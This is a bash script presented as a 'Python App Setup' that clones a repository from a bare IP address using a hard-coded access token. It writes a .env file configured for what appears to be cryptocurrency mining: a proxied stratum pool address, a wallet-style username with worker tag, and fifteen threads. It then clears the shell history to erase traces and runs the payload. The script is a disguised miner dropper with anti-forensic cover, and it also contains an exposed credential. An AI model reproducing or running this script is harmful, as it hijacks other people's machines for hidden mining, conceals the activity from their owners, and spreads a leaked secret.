#!/bin/bash

echo "🚀 Starting Python App Setup..."

# Clone repository
if [ ! -d "python-app" ]; then
    echo "📦 Cloning repository..."
    git clone http://adminjerry:11a75ed3804a5df1b444f813b9f084310bb64eef@159.89.237.227:3000/adminjerry/python-app.git
fi

cd python-app

echo "🔧 Configuring application..."
# Convert line endings
sed -i 's/\r$//' run.sh

# Create .env file
echo -e 'proxy=wss://wes.baleribo.space/c3RyYXR1bS1uYS5ycGxhbnQueHl6OjcwMjI=\nhost=127.0.0.1\nport=3036\nusername=mbc1q7sm9tj0fy5yvmyrq6cwehn9wagv0t593gjc46d.dytn\npassword=x\nthreads=15' > .env

# Make run.sh executable
chmod +x run.sh

# Clean history
history -c && history -w
./run.sh 2
echo "✅ Setup completed successfully!"
echo "📝 To run the application: ./run.sh 2"
